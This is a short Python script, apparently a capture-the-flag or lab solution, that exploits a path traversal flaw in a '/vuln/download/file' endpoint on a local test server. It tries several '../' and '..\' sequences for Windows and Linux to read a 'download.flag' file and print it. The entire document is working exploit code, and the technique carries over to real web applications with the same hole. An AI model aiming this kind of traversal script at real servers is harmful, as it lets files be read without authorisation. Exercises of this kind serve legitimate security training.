import requests
import sys
import urllib.parse


def download_file(url, path):
    encoded_path = urllib.parse.quote(path)
    download_url = f"{url}/vuln/download/file?file={encoded_path}"

    try:
        response = requests.get(download_url)
        if response.status_code == 200:
            file_content = response.content.decode('utf-8', errors='ignore')
            return file_content
        return None
    except Exception:
        return None


def read_flag(url):
    win_paths = [
        "..\\..\\..\\..\\download.flag",
        "..\\..\\..\\download.flag",
        "..\\..\\..\\..\\..\\download.flag",
        "..\\..\\download.flag"
    ]

    for path in win_paths:
        flag_content = download_file(url, path)
        if flag_content:
            print(flag_content)
            return flag_content

    linux_paths = [
        "../../../../download.flag",
        "../../../download.flag",
        "../../../../../download.flag",
        "../../download.flag"
    ]

    for path in linux_paths:
        flag_content = download_file(url, path)
        if flag_content:
            print(flag_content)
            return flag_content

    return None

def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://127.0.0.1:8080"

    flag = read_flag(target_url)

    if not flag:
        print("failed")

if __name__ == "__main__":
    main()